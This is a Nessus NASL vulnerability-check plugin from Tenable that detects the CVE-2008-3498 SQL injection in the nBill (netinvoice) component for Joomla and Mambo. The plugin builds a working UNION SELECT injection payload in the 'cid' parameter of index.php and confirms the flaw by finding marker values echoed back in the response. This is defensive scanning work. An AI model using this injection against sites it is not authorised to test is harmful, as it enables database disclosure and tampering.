#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(33272);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(29951);
  script_xref(name:"milw0rm", value:"5939");
  script_xref(name:"Secunia", value:"30752");
  script_xref(name:"OSVDB", value:"46514");
  script_cve_id("CVE-2008-3498");

  script_name(english:"nBill component for Joomla! index.php cid Parameter SQL Injection");
  script_summary(english:"Tries to manipulate the component heading for a new order");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of the nBill (also known as netinvoice) component for
Joomla and Mambo installed on the remote host fails to sanitize user-
supplied input to the 'cid' parameter before using it in database
queries.  Regardless of PHP's 'magic_quotes_gpc' setting, an attacker
may be able to exploit this issue to manipulate database queries,
leading to disclosure of sensitive information, modification of data,
or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
dirs = make_list();

# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs = make_list(dirs, dir);
  }
}
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs = make_list(dirs, dir);
  }
}


magic1 = unixtime();
magic2 = rand();


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the issue to manipulate the component header for an order.
  base_exploit = string("-1 UNION SELECT 1,2,3,concat(", magic1, ",0x3a,", magic2, ")");
  for (n=5; n<48; n++)
    base_exploit = string(base_exploit, ",", n);

  for (n=48; n<=51; n++)
  {
    base_exploit = string(base_exploit, ",", n);
    url = string(
      dir, "/index.php?",
      "option=com_netinvoice&",
      "action=orders&",
      "task=order&",
      "cid=", urlencode(str:base_exploit+"--")
    );
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we could manipulate the component header.
    if (
      "billing-form-detail" >< res &&
      (
        string('componentheading">', magic1, ":", magic2, "<") >< res ||
        string('>New Order</a> > ', magic1, ":", magic2, "<") >< res
      )
    )
    {
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
